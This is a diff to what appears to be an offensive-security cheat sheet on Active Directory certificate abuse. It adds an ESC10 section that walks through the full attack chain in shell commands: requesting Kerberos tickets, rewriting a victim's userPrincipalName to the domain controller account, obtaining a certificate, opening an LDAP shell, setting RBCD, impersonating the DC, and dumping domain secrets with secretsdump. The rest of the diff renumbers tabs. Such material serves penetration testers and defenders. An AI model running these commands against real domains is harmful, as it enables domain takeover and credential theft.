@@ -692,10 +692,135 @@ evil-winrm -i <TARGET> -u administrator -H <HASH>
 
 ---
 
-### ESC14a: Weak Explicit Certificate Mapping (altSecurityIdentities)
+### ESC10: Weak Certificate Mapping for Schannel Authentication
 
 {{< tab set11 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set11 tab1 >}}
+
+#### 1. Request a TGT
+
+```console
+# Password
+sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
+```
+
+```console
+# NTLM
+sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<USER>' -hashes ':<HASH>' -dc-ip <DC_IP>
+```
+
+```console
+export KRB5CCNAME='<USER>.ccache'
+```
+
+#### 2. Check
+
+```console
+# Look for WRITE on altSecurityIdentities
+bloodyAD -d <DOMAIN> -k --host <DC> get writable --detail
+```
+
+```console {class="sample-code"}
+altSecurityIdentities: WRITE
+```
+
+```console
+# Look for CertificateMappingMethods = 0x4
+reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\'
+```
+
+```console {class="sample-code"}
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\'
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
+    EventLogging    REG_DWORD    0x1
+    CertificateMappingMethods    REG_DWORD    0x4
+```
+
+```console
+# Look for Target User UPN
+certipy-ad account -k -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' read
+```
+
+#### 2. Modify Target User's userPrincipalName
+
+```console
+# Kerberos
+certipy-ad account -k -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' -upn '<DC_HOSTNAME>$@<DOMAIN>' update
+```
+
+#### 2. Request a Cert of Target User
+
+```console
+# Password
+sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<TARGET_USER>:<PASSWORD>' -dc-ip <DC_IP>
+```
+
+```console
+# NTLM
+sudo ntpdate -s <DC_IP> && impacket-getTGT '<DOMAIN>/<TARGET_USER>' -hashes ':<HASH>' -dc-ip <DC_IP>
+```
+
+```console
+export KRB5CCNAME='<TARGET_USER>.ccache'
+```
+
+```console
+certipy-ad req -k -target '<DC>' -dc-ip '<DC_IP>' -ca '<CA>' -template 'User'
+```
+
+#### 3. Change Back Target User's userPrincipalName
+
+```console
+export KRB5CCNAME='<USER>.ccache'
+```
+
+```console
+certipy-ad account -k -target '<DC>' -dc-ip '<DC_IP>' -user '<TARGET_USER>' -upn '<UPN>' update
+```
+
+#### 4. Get LDAP Shell
+
+```console
+certipy-ad auth -pfx '<DC_HOSTNAME>.pfx' -dc-ip '<DC_IP>' -ldap-shell
+```
+
+#### 5. Set RBCD
+
+```console
+set_rbcd <DC_HOSTNAME>$ <USER>
+```
+
+#### 6. Get a Service Ticket
+
+```console
+# Password
+impacket-getST '<DOMAIN>/<USER>:<PASSWORD>' -spn 'ldap/<DC>' -impersonate <DC_HOSTNAME>
+```
+
+```console
+# NTLM
+impacket-getST '<DOMAIN>/<USER>' -hashes ':<HASH>' -spn 'ldap/<DC>' -impersonate <DC_HOSTNAME>
+```
+
+```console
+export KRB5CCNAME='<DC_HOSTNAME>@ldap_<DC>@<DOMAIN>.ccache'
+```
+
+#### 7. Secretsdump
+
+```console
+impacket-secretsdump -k -no-pass <DC>
+```
+
+{{< /tabcontent >}}
+
+---
+
+### ESC14a: Weak Explicit Certificate Mapping (altSecurityIdentities)
+
+{{< tab set12 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set12 tab1 >}}
 
 #### 1. Create a Computer
 
@@ -751,8 +876,8 @@ certipy-ad auth -pfx evilcomputer.pfx -domain <DOMAIN> -dc-ip <DC_IP> -username 
 
 ### ESC14b: Weak Explicit Certificate Mapping (E-Mail)
 
-{{< tab set12 tab1 >}}Linux{{< /tab >}}
-{{< tabcontent set12 tab1 >}}
+{{< tab set13 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set13 tab1 >}}
 
 #### 1. Modify Email of Target User
 
@@ -780,8 +905,8 @@ certipy-ad auth -pfx <USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP> -username <TARGE
 
 ### ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")
 
-{{< tab set13 tab1 >}}Linux{{< /tab >}}
-{{< tabcontent set13 tab1 >}}
+{{< tab set14 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set14 tab1 >}}
 
 #### 1. Lookup SID
 
@@ -866,8 +991,8 @@ add_user_to_group <NEW_USER> 'Remote Management Users'
 
 ### ESC16: Security Extension Disabled on CA (Globally)
 
-{{< tab set14 tab1 >}}Linux{{< /tab >}}
-{{< tabcontent set14 tab1 >}}
+{{< tab set15 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set15 tab1 >}}
 
 #### 1. Read Initial UPN of the Victim Account \[Optional\]
 
@@ -916,9 +1041,9 @@ certipy-ad cert -pfx '<USER>.pfx' -nocert -out '<USER>.key'
 certipy-ad cert -pfx '<USER>.pfx' -nokey -out '<USER>.crt'
 ```
 
-{{< tab set15 tab1 >}}LDAP Shell{{< /tab >}}
-{{< tab set15 tab2 >}}RBCD{{< /tab >}}
-{{< tabcontent set15 tab1 >}}
+{{< tab set16 tab1 >}}LDAP Shell{{< /tab >}}
+{{< tab set16 tab2 >}}RBCD{{< /tab >}}
+{{< tabcontent set16 tab1 >}}
 
 #### 1. Get a LDAP Shell
 
@@ -941,7 +1066,7 @@ evil-winrm -i <TARGET_DOMAIN> -u '<USER>' -p '<PASSWORD>'
 <small>*Ref: [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)*</small>
 
 {{< /tabcontent >}}
-{{< tabcontent set15 tab2 >}}
+{{< tabcontent set16 tab2 >}}
 
 #### 1. RBCD Attack
 
